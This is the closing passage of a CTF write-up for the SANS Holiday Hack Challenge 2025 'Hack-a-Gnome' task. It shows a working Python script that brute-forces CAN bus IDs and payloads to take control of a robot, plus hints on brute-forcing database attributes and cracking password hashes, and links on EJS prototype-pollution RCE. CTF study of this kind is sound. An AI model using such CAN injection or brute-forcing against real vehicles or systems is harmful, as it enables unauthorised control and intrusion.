</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">in</span> before <span style="color:#f92672">or</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">in</span> after:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> abs(after[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> before[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">&gt;=</span> threshold <span style="color:#f92672">or</span> abs(after[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> before[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&gt;=</span> threshold
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_frame</span>(bus, arb_id, data: bytes, extended<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> can<span style="color:#f92672">.</span>Message(arbitration_id<span style="color:#f92672">=</span>arb_id, data<span style="color:#f92672">=</span>data, is_extended_id<span style="color:#f92672">=</span>extended)
</span></span><span style="display:flex;"><span>    bus<span style="color:#f92672">.</span>send(msg)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scan</span>(bus, start, end, payloads, extended<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, rate_sleep<span style="color:#f92672">=</span><span style="color:#ae81ff">0.03</span>, verbose_every<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    hits <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    _ <span style="color:#f92672">=</span> read_rpm_snapshot(bus, <span style="color:#ae81ff">0.30</span>)  <span style="color:#75715e"># prime</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    attempt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> arb_id <span style="color:#f92672">in</span> range(start, end):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> data <span style="color:#f92672">in</span> payloads:
</span></span><span style="display:flex;"><span>            attempt <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> verbose_every <span style="color:#f92672">and</span> attempt <span style="color:#f92672">%</span> verbose_every <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># OUTPUT EXACTLY WHAT WE&#39;RE TRYING</span>
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;TRY id=0x</span><span style="color:#e6db74">{</span>arb_id<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> dlc=</span><span style="color:#e6db74">{</span>len(data)<span style="color:#e6db74">}</span><span style="color:#e6db74"> data=</span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(empty)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            before <span style="color:#f92672">=</span> read_rpm_snapshot(bus, <span style="color:#ae81ff">0.12</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                send_frame(bus, arb_id, data, extended<span style="color:#f92672">=</span>extended)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> can<span style="color:#f92672">.</span>CanError:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>            after <span style="color:#f92672">=</span> read_rpm_snapshot(bus, <span style="color:#ae81ff">0.22</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> rpm_changed(before, after):
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;HIT id=0x</span><span style="color:#e6db74">{</span>arb_id<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> data=</span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(empty)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> RPM </span><span style="color:#e6db74">{</span>before<span style="color:#e6db74">}</span><span style="color:#e6db74">-&gt;</span><span style="color:#e6db74">{</span>after<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>                hits<span style="color:#f92672">.</span>append((arb_id, data, before, after))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(rate_sleep)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hits
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    bus <span style="color:#f92672">=</span> can<span style="color:#f92672">.</span>interface<span style="color:#f92672">.</span>Bus(channel<span style="color:#f92672">=</span>IFACE, interface<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;socketcan&#34;</span>, receive_own_messages<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payloads <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>,         <span style="color:#75715e"># empty</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFF</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x14\x14</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># +20,+20</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xEC\xEC</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># -20,-20</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xEC\x14</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># left -, right +</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x14\xEC</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># left +, right -</span>
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Scanning standard IDs 0x</span><span style="color:#e6db74">{</span>SCAN_START<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74">-0x</span><span style="color:#e6db74">{</span>SCAN_END<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> ...&#34;</span>)
</span></span><span style="display:flex;"><span>    hits <span style="color:#f92672">=</span> scan(
</span></span><span style="display:flex;"><span>        bus,
</span></span><span style="display:flex;"><span>        start<span style="color:#f92672">=</span>SCAN_START,
</span></span><span style="display:flex;"><span>        end<span style="color:#f92672">=</span>SCAN_END,
</span></span><span style="display:flex;"><span>        payloads<span style="color:#f92672">=</span>payloads,
</span></span><span style="display:flex;"><span>        extended<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>        rate_sleep<span style="color:#f92672">=</span><span style="color:#ae81ff">0.03</span>,
</span></span><span style="display:flex;"><span>        verbose_every<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>,   <span style="color:#75715e"># set to e.g. 10 if too chatty</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Done. Hits: </span><span style="color:#e6db74">{</span>len(hits)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> arb_id, data, before, after <span style="color:#f92672">in</span> hits[:<span style="color:#ae81ff">50</span>]:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;  0x</span><span style="color:#e6db74">{</span>arb_id<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(empty)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>before<span style="color:#e6db74">}</span><span style="color:#e6db74">-&gt;</span><span style="color:#e6db74">{</span>after<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bus<span style="color:#f92672">.</span>shutdown()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()</span></span></code></pre></div>
<p>I now had a manageable range. In order to make use of it, I downloaded the <em>canbus_client.py</em> locally and entered my HEX codes in its <em>COMMAND_MAP</em> structure. Then reuploaded the script under a new name and ran it. It took some tries to get the mapping exactly right. In the end I ended up with this mapping that worked well:</p>
<table>
  <thead>
      <tr>
          <th>Button</th>
          <th>Canbus command id</th>
          <th>New Value</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>w</td>
          <td>0x656</td>
          <td>0x201</td>
      </tr>
      <tr>
          <td>a</td>
          <td>0x658</td>
          <td>0x203</td>
      </tr>
      <tr>
          <td>s</td>
          <td>0x657</td>
          <td>0x202</td>
      </tr>
      <tr>
          <td>d</td>
          <td>0x659</td>
          <td>0x204</td>
      </tr>
  </tbody>
</table>
<p>In the final version I was able to navigate my robot through the maze using this command and directions:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>python3 script_name &lt;direction&gt;</code></pre></div>
<p>Leading me to solving the objective:</p>
<p><a href="#R-image-d71518d9db2a576c59743cad199b1b1a" class="lightbox-link"><img alt="Final screen" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-d71518d9db2a576c59743cad199b1b1a"><img alt="Final screen" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png"></a></p>
<p>Complex systems fail at the seams between components, not just at obvious security controls.</p>
<h2 id="chris-davis-closing-words">Chris Davis closing words</h2>
<p>After solving, Chris says:</p>
<blockquote>
<p>Excellent work! You&rsquo;ve successfully taken control of the gnome - look at that interface responding to our commands now.</p>
<p>Time to turn this little rebel against its own manufacturing operation and shut them down for good!</p>
</blockquote>
<h3 id="hints">Hints</h3>
<table>
  <thead>
      <tr>
          <th>Hint</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message.</td>
      </tr>
      <tr>
          <td>I actually helped design the software that controls the factory back when we used it to make toys. It&rsquo;s quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome&rsquo;s stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you&rsquo;d have to start all over again).</td>
      </tr>
      <tr>
          <td>There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user&rsquo;s entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it.</td>
      </tr>
      <tr>
          <td>Once you determine the type of database the gnome control factory&rsquo;s login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.</td>
      </tr>
      <tr>
          <td>Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome&rsquo;s control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory&rsquo;s pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.</td>
      </tr>
      <tr>
          <td>Nice! Once you have command-line access to the gnome, you&rsquo;ll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.</td>
      </tr>
  </tbody>
</table>
<h2 id="resources">Resources</h2>
<p>This objective required extensive reading up on the whole __proto__ attack vector. We found these resources of great value for our research:</p>
<ul>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-EJS-2803307" rel="external">https://security.snyk.io/vuln/SNYK-JS-EJS-2803307</a></li>
<li><a href="https://blog.themikkel.dk/ddc-regionale-2025-writeup/" rel="external">https://blog.themikkel.dk/ddc-regionale-2025-writeup/</a></li>
<li><a href="https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/" rel="external">https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/</a></li>
<li><a href="https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs" rel="external">https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs</a></li>
<li><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce" rel="external">https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce</a></li>
<li><a href="https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325" rel="external">https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</a></li>
<li><a href="https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3" rel="external">https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3</a></li>
<li><a href="https://ejs.co/#docs" rel="external">https://ejs.co/#docs</a></li>
</ul>

  <footer class="footline">
              <i class='fa-fw fas fa-calendar'></i> Dec 23, 2025
  </footer>
</article>
        </div>
      </main>
    </div>
    <aside id="R-sidebar" class="default-animation">
      <div id="R-header-topbar" class="default-animation"></div>
      <div id="R-header-wrapper" class="default-animation">
        <div id="R-header" class="default-animation">
          <a id="R-logo" class="R-default" href="/index.html">
            <div class="logo-title">SANS Holiday Hack Challenge 2025</div>
          </a>
        </div>
      </div>
      <div id="R-homelinks" class="default-animation homelinks">
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-homelinks">
          <ul class="space collapsible-menu">
            <li class="" data-nav-url="/index.html"><a class="padding" href="/index.html"><i class="fa-fw fas fa-home"></i> Home</a></li>
          </ul>
        </div>
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-headercontrols">
          <ul class="">
          </ul>
        </div>
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
      </div>
      <div id="R-content-wrapper" class="highlightable">
        <div class="R-sidebarmenu R-shortcutmenu-main">
          <ul class="enlarge morespace collapsible-menu">
            <li class="" data-nav-url="/act1/index.html"><a class="padding" href="/act1/index.html">Act 1</a><ul id="R-subsections-8dc0c36ceefa45529ff4cf1f9bdc1f66" class="collapsible-menu"></ul></li>
            <li class="" data-nav-url="/act2/index.html"><a class="padding" href="/act2/index.html">Act 2</a><ul id="R-subsections-9d3d8c898368693a495088de36411fa6" class="collapsible-menu"></ul></li>
            <li class="parent " data-nav-url="/act3/index.html"><a class="padding" href="/act3/index.html">Act 3</a><ul id="R-subsections-0b6215c9fad834351813cc2ad0d4a335" class="collapsible-menu">
            <li class="" data-nav-url="/act3/gnome-tea/index.html"><a class="padding" href="/act3/gnome-tea/index.html">Gnome Tea</a></li>
            <li class="active " data-nav-url="/act3/hack-a-gnome/index.html"><a class="padding" href="/act3/hack-a-gnome/index.html">Hack-a-Gnome</a></li>
            <li class="" data-nav-url="/act3/snowcat-rce-and-priv-esc/index.html"><a class="padding" href="/act3/snowcat-rce-and-priv-esc/index.html">Snowcat RCE &amp; Priv Esc</a></li>
            <li class="" data-nav-url="/act3/schrodingers-scope/index.html"><a class="padding" href="/act3/schrodingers-scope/index.html">SchrÃ¶dingers Scope</a></li>
            <li class="" data-nav-url="/act3/find-and-shutdown-frostys-snowglobe-machine/index.html"><a class="padding" href="/act3/find-and-shutdown-frostys-snowglobe-machine/index.html">Find and Shutdown Frostys Snowglobe Machine</a></li>
            <li class="" data-nav-url="/act3/on-the-wire/index.html"><a class="padding" href="/act3/on-the-wire/index.html">On the Wire</a></li>
            <li class="" data-nav-url="/act3/free-ski/index.html"><a class="padding" href="/act3/free-ski/index.html">Free Ski</a></li>
            <li class="" data-nav-url="/act3/snowblind-ambush/index.html"><a class="padding" href="/act3/snowblind-ambush/index.html">Snowblind Ambush</a></li></ul></li>
            <li class="" data-nav-url="/endgame/index.html"><a class="padding" href="/endgame/index.html">Endgame</a></li>
            <li class="" data-nav-url="/about/index.html"><a class="padding" href="/about/index.html">About Roger Johnsen</a></li>
          </ul>
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-shortcuts">
          <ul class="space collapsible-menu">
          </ul>
        </div>
        <div id="R-footer-margin"></div>
        <div class="R-menu-divider default-animation">
          <hr class="padding">
        </div>
        <div class="R-sidebarmenu R-shortcutmenu-footercontrols">
          <ul class="">
          </ul>
        </div>
<div id="R-footer"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
      </div>
    </aside>
    <script src="/js/js-yaml/js-yaml.min.js?1767537315" defer></script>
    <script src="/js/d3/d3-color.min.js?1767537315" defer></script>
    <script src="/js/d3/d3-dispatch.min.js?1767537315" defer></script>
    <script src="/js/d3/d3-drag.min.js?1767537315" defer></script>
    <script src="/js/d3/d3-ease.min.js?1767537315" defer></script>
    <script src="/js/d3/d3-interpolate.min.js?1767537315" defer></script>
    <script src="/js/d3/d3-selection.min.js?1767537315" defer></script>
    <script src="/js/d3/d3-timer.min.js?1767537315" defer></script>
    <script src="/js/d3/d3-transition.min.js?1767537315" defer></script>
    <script src="/js/d3/d3-zoom.min.js?1767537315" defer></script>
    <script src="/js/mermaid/mermaid.min.js?1767537315" defer></script>
    <script>
      window.relearn.themeUseMermaid = JSON.parse("{}");
    </script>
    <script src="/js/clipboard/clipboard.min.js?1767537315" defer></script>
    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1767537315" defer></script>
    <script src="/js/theme.js?1767537315" defer></script>
  </body>
</html>
